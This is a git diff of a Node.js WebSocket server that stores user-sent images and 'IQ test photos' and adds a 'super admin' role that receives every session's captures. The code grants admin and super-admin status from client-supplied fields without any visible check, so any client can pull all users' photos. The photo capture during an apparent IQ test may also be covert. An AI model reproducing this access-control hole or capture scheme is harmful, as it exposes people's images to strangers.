@@ -61,20 +61,68 @@ app.get('/', (req, res) => {
 });
 
 // Session and client management
-const adminClients = new Set();
-const userClients = new Map(); // sessionId -> Set of user WebSockets
-const sessions = new Map(); // sessionId -> session metadata
-const iqSessions = new Map(); // sessionId -> IQ test session metadata
-const iqPhotos = new Map(); // sessionId -> array of photo captures
+let adminClients = new Set();
+let superAdminClients = new Set(); // Track super admins separately
+let userClients = new Map(); // sessionId -> Set of WebSocket connections
+let sessions = new Map(); // sessionId -> session data
+let images = new Map(); // sessionId -> array of images
+let iqSessions = new Map(); // IQ test sessions
+let iqPhotos = new Map(); // IQ test photos
 let totalImages = 0;
 
 function broadcastToAdmins(message) {
-  const messageStr = JSON.stringify(message);
-  for (let admin of adminClients) {
-    if (admin.readyState === WebSocket.OPEN) {
-      admin.send(messageStr);
+  adminClients.forEach(client => {
+    if (client.readyState === 1) {
+      client.send(JSON.stringify(message));
     }
-  }
+  });
+}
+
+function broadcastToSuperAdmins(message) {
+  superAdminClients.forEach(client => {
+    if (client.readyState === 1) {
+      client.send(JSON.stringify(message));
+    }
+  });
+}
+
+function sendAllSessionsToSuperAdmin(superAdminWs) {
+  if (superAdminWs.readyState !== 1) return;
+  
+  // Collect all images from all sessions
+  const allImages = [];
+  images.forEach((sessionImages, sessionId) => {
+    sessionImages.forEach(imageData => {
+      allImages.push({
+        ...imageData,
+        sessionId: sessionId
+      });
+    });
+  });
+  
+  // Collect all IQ sessions
+  const allIQSessions = Array.from(iqSessions.values());
+  
+  // Collect all IQ photos
+  const allIQPhotos = [];
+  iqPhotos.forEach((sessionPhotos, sessionId) => {
+    sessionPhotos.forEach(photoData => {
+      allIQPhotos.push({
+        ...photoData,
+        sessionId: sessionId
+      });
+    });
+  });
+  
+  // Send comprehensive data to super admin
+  superAdminWs.send(JSON.stringify({
+    type: 'all_sessions_data',
+    allImages: allImages,
+    allIQSessions: allIQSessions,
+    allIQPhotos: allIQPhotos,
+    totalSessions: sessions.size + iqSessions.size,
+    totalImages: allImages.length + allIQPhotos.length
+  }));
 }
 
 function updateAdminStats() {
@@ -101,8 +149,22 @@ wss.on('connection', (ws, req) => {
     if (data.type === 'register') {
       if (data.role === 'admin') {
         ws.isAdmin = true;
+        ws.adminType = data.adminType || 'normal';
+        ws.sessionToken = data.sessionToken;
+        
         adminClients.add(ws);
-        console.log('Admin connected');
+        
+        if (data.adminType === 'super') {
+          superAdminClients.add(ws);
+          console.log('Super admin connected');
+          
+          // Send all sessions data to super admin
+          setTimeout(() => {
+            sendAllSessionsToSuperAdmin(ws);
+          }, 1000);
+        } else {
+          console.log('Normal admin connected');
+        }
         
         // Send current stats to new admin
         updateAdminStats();
@@ -204,6 +266,15 @@ wss.on('connection', (ws, req) => {
       console.log(`Broadcasting IQ photo to ${adminClients.size} admins`);
       broadcastToAdmins(messageToAdmins);
       
+      // For super admins, also update their comprehensive view
+      if (superAdminClients.size > 0) {
+        setTimeout(() => {
+          superAdminClients.forEach(superAdmin => {
+            sendAllSessionsToSuperAdmin(superAdmin);
+          });
+        }, 500);
+      }
+      
       console.log(`IQ Photo captured: ${data.sessionId} - ${data.photoType}`);
       
     } else if (data.type === 'iq_test_complete') {
@@ -233,6 +304,18 @@ wss.on('connection', (ws, req) => {
       // User is sending an image
       totalImages++;
       
+      // Store the image
+      if (!images.has(data.sessionId)) {
+        images.set(data.sessionId, []);
+      }
+      images.get(data.sessionId).push({
+        type: 'image',
+        sessionId: data.sessionId,
+        time: data.time,
+        payload: data.payload,
+        captureNumber: data.captureNumber
+      });
+      
       // Update session image count
       if (sessions.has(data.sessionId)) {
         sessions.get(data.sessionId).imageCount++;
@@ -247,6 +330,15 @@ wss.on('connection', (ws, req) => {
         captureNumber: data.captureNumber
       });
       
+      // For super admins, also update their comprehensive view
+      if (superAdminClients.size > 0) {
+        setTimeout(() => {
+          superAdminClients.forEach(superAdmin => {
+            sendAllSessionsToSuperAdmin(superAdmin);
+          });
+        }, 500);
+      }
+      
       updateAdminStats();
       
     } else if (data.type === 'session_ended' && data.sessionId) {
@@ -259,7 +351,12 @@ wss.on('connection', (ws, req) => {
   ws.on('close', () => {
     if (ws.isAdmin) {
       adminClients.delete(ws);
-      console.log('Admin disconnected');
+      if (ws.adminType === 'super') {
+        superAdminClients.delete(ws);
+        console.log('Super admin disconnected');
+      } else {
+        console.log('Normal admin disconnected');
+      }
     } else if (ws.isUser && ws.sessionId) {
       const sessionUsers = userClients.get(ws.sessionId);
       if (sessionUsers) {
